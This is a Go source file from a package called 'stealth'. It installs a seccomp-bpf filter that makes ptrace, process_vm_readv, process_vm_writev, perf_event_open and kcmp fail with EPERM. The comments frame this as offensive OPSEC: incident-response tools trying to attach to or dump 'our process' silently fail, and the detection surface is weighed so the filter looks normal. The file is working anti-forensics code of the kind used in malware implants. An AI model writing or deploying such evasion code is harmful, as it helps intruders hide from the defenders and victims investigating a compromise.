package stealth

// SECCOMP_RET_USER_NOTIF — Userspace Syscall Interception & Forensic Blocking
//
// OPSEC rationale: seccomp-bpf filters run in the kernel and intercept
// syscalls BEFORE they execute. Two key capabilities:
//
// 1. SECCOMP_RET_ERRNO: Return fake errors to specific syscalls. We install
//    a filter that makes ptrace(), process_vm_readv(), and other forensic
//    syscalls return EPERM. IR tools trying to attach to or dump our process
//    silently fail.
//
// 2. SECCOMP_RET_USER_NOTIF (kernel 5.0+): Redirect specific syscalls to a
//    supervisor process via a notification fd. The supervisor can inspect,
//    modify, or fake the response. This is invisible to strace/auditd
//    because the filter runs inside the kernel before any tracing hook.
//
// Detection surface:
//   - /proc/[pid]/status shows Seccomp: 2 (filter mode) — but many legit
//     apps use seccomp (Chrome, Firefox, systemd services)
//   - /proc/[pid]/seccomp_filter (if CHECKPOINT_RESTORE enabled) could
//     reveal the filter bytecode
//   - The presence of seccomp is NORMAL for modern services and not suspicious
//
// Capability: None (seccomp is unprivileged since kernel 3.17 with NO_NEW_PRIVS)
// Kernel: 3.17+ (seccomp filter), 5.0+ (USER_NOTIF)

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

// seccomp constants.
const (
	// seccomp operations for the seccomp() syscall
	sysSeccomp           = 317 // __NR_seccomp (x86_64)
	seccompSetModeFilter = 1   // SECCOMP_SET_MODE_FILTER

	// BPF return actions
	seccompRetAllow     = 0x7fff0000 // SECCOMP_RET_ALLOW
	seccompRetErrno     = 0x00050000 // SECCOMP_RET_ERRNO (OR'd with errno)
	seccompRetUserNotif = 0x7fc00000 // SECCOMP_RET_USER_NOTIF

	// BPF instruction classes
	bpfLD  = 0x00
	bpfJMP = 0x05
	bpfRET = 0x06
	bpfW   = 0x00
	bpfABS = 0x20
	bpfJEQ = 0x10
	bpfK   = 0x00

	// Audit arch for x86_64
	auditArchX86_64 = 0xc000003e

	// seccomp_data offsets
	secdataNR   = 0 // offset of syscall number
	secdataArch = 4 // offset of arch
)

// Syscall numbers to block (x86_64).
const (
	nrPtrace          = 101
	nrProcessVMReadv  = 310
	nrProcessVMWritev = 311
	nrPerfEventOpen   = 298
	nrKcmp            = 312
)

// cbpfInsn is a classic BPF instruction (8 bytes).
type cbpfInsn struct {
	code uint16
	jt   uint8
	jf   uint8
	k    uint32
}

// sockFprog is the BPF program descriptor passed to seccomp.
type sockFprog struct {
	len    uint16
	_      [6]byte // padding
	filter unsafe.Pointer
}

// InstallForensicBlock installs a seccomp-bpf filter that blocks forensic
// syscalls with EPERM. After this, ptrace/process_vm_readv/perf_event_open
// targeting our process will fail silently.
//
// Must call prctl(PR_SET_NO_NEW_PRIVS, 1) first (done automatically).
func InstallForensicBlock() error {
	// Enable NO_NEW_PRIVS (required for unprivileged seccomp)
	_, _, errno := syscall.RawSyscall(
		syscall.SYS_PRCTL,
		38, // PR_SET_NO_NEW_PRIVS
		1, 0,
	)
	if errno != 0 {
		return fmt.Errorf("PR_SET_NO_NEW_PRIVS: %v", errno)
	}

	filter := buildForensicBlockFilter()
	return loadSeccompFilter(filter)
}

// buildForensicBlockFilter creates a BPF program that:
// 1. Checks arch == x86_64 (reject if wrong)
// 2. Loads syscall number
// 3. If ptrace/process_vm_readv/process_vm_writev/perf_event_open → ERRNO(EPERM)
// 4. Otherwise → ALLOW
func buildForensicBlockFilter() []cbpfInsn {
	blocked := []uint32{
		nrPtrace,
		nrProcessVMReadv,
		nrProcessVMWritev,
		nrPerfEventOpen,
		nrKcmp,
	}

	nBlocked := len(blocked)

	// BPF program structure:
	// [0] LD arch
	// [1] JEQ x86_64 → continue, else → allow
	// [2] LD syscall_nr
	// [3..3+n-1] JEQ blocked[i] → deny
	// [3+n] RET ALLOW
	// [3+n+1] RET ERRNO(EPERM)

	insns := make([]cbpfInsn, 0, 4+nBlocked)

	// Load architecture
	insns = append(insns, cbpfInsn{
		code: bpfLD | bpfW | bpfABS,
		k:    secdataArch,
	})

	// Check arch == x86_64 (skip to allow if wrong arch)
	insns = append(insns, cbpfInsn{
		code: bpfJMP | bpfJEQ | bpfK,
		jt:   0,                   // match: continue
		jf:   uint8(nBlocked + 1), // no match: skip to ALLOW
		k:    auditArchX86_64,
	})

	// Load syscall number
	insns = append(insns, cbpfInsn{
		code: bpfLD | bpfW | bpfABS,
		k:    secdataNR,
	})

	// Check each blocked syscall
	for i, nr := range blocked {
		insns = append(insns, cbpfInsn{
			code: bpfJMP | bpfJEQ | bpfK,
			jt:   uint8(nBlocked - i), // match: jump to DENY
			jf:   0,                   // no match: fall through to next check
			k:    nr,
		})
	}

	// ALLOW (default)
	insns = append(insns, cbpfInsn{
		code: bpfRET | bpfK,
		k:    seccompRetAllow,
	})

	// DENY with EPERM
	insns = append(insns, cbpfInsn{
		code: bpfRET | bpfK,
		k:    seccompRetErrno | 1, // EPERM = 1
	})

	return insns
}

// loadSeccompFilter installs a BPF filter via the seccomp() syscall.
func loadSeccompFilter(insns []cbpfInsn) error {
	// Encode instructions to bytes
	progBytes := make([]byte, len(insns)*8)
	for i, insn := range insns {
		off := i * 8
		binary.LittleEndian.PutUint16(progBytes[off:], insn.code)
		progBytes[off+2] = insn.jt
		progBytes[off+3] = insn.jf
		binary.LittleEndian.PutUint32(progBytes[off+4:], insn.k)
	}

	prog := sockFprog{
		len:    uint16(len(insns)),
		filter: unsafe.Pointer(&progBytes[0]),
	}

	_, _, errno := syscall.Syscall(
		uintptr(sysSeccomp),
		seccompSetModeFilter,
		0, // flags
		uintptr(unsafe.Pointer(&prog)),
	)
	if errno != 0 {
		return fmt.Errorf("seccomp SET_MODE_FILTER: %v", errno)
	}

	return nil
}

// SeccompForensicBlockAvailable tests if seccomp filtering is available.
// Does NOT actually install a filter.
func SeccompForensicBlockAvailable() bool {
	// Check /proc/sys/kernel/seccomp/actions_avail for ERRNO support
	// If the file doesn't exist, seccomp may still be available (older kernels)
	_, _, errno := syscall.RawSyscall(
		syscall.SYS_PRCTL,
		35, // PR_GET_SECCOMP
		0, 0,
	)
	// Returns 0 if seccomp disabled, 2 if filter mode active
	// EINVAL if seccomp not compiled into kernel
	return errno == 0
}
